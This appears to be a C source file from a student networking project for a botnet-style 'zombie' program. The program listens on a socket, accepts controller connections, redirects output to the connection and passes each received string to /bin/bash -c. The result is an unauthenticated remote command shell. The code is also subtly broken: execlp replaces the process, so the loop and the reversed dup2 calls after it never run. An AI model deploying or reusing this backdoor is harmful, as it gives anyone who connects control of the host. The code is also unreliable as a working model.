#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"
#include "reseau.h"

volatile sig_atomic_t end = 0;

void endHandler(int sig)
{
  end = 1;
}

void zombieFils(void* sockfdController){
    while(!end){
        int *sockfd = sockfdController;

        dup2(*sockfd, STDOUT_FILENO);
        dup2(*sockfd, STDERR_FILENO);
        
        char commande[1024];
        memset(commande, 0, sizeof(commande));
        sread(*sockfd, commande, sizeof(commande) - 1);

        execlp("/bin/bash", "bash", "-c", commande, NULL);
        
        dup2(STDOUT_FILENO, *sockfd);
        dup2(STDERR_FILENO, *sockfd);
    }
}

int main(int argc, char *argv[]){
    ssigaction(SIGINT, endHandler);

    int sockfd = initSocketZombie();

    int sockfdController;
    
    while(!end){
        sockfdController = saccept(sockfd);

        fork_and_run1(zombieFils, &sockfdController);
    }
    sclose(sockfdController);
    return 0;
    
}